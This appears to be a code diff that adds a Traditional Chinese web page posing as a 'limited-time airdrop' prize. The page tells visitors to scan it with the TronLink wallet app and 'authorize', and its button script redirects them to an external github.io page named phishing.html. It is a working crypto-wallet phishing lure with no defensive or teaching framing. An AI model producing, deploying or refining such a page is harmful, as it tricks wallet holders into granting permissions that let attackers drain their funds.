@@ -1,14 +1,47 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
-<html>
+<!DOCTYPE html>
+<html lang="zh-Hant">
 <head>
-  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-  <meta http-equiv="Content-Style-Type" content="text/css">
-  <title></title>
-  <meta name="Generator" content="Cocoa HTML Writer">
-  <meta name="CocoaVersion" content="2575.5">
-  <style type="text/css">
+  <meta charset="UTF-8">
+  <title>限時空投活動</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f5f5f5;
+      text-align: center;
+      padding: 50px;
+    }
+    h1 {
+      color: #333;
+    }
+    #notice {
+      color: #cc0000;
+      font-weight: bold;
+      margin-top: 20px;
+    }
+    button {
+      margin-top: 30px;
+      padding: 12px 30px;
+      font-size: 18px;
+      background-color: #28a745;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
   </style>
 </head>
 <body>
+  <h1>🎉 恭喜您獲得限時空投！</h1>
+  <p>請使用 <b>TronLink App</b> 掃描此頁，進行授權</p>
+  <p id="notice">若您非使用 TronLink 瀏覽器，請點下方按鈕繼續</p>
+
+  <button onclick="go()">點我開啟授權頁面</button>
+
+  <script>
+    function go() {
+      window.location.href = "https://jdcaut.github.io/officeTRX/phishing.html";
+    }
+  </script>
 </body>
 </html>
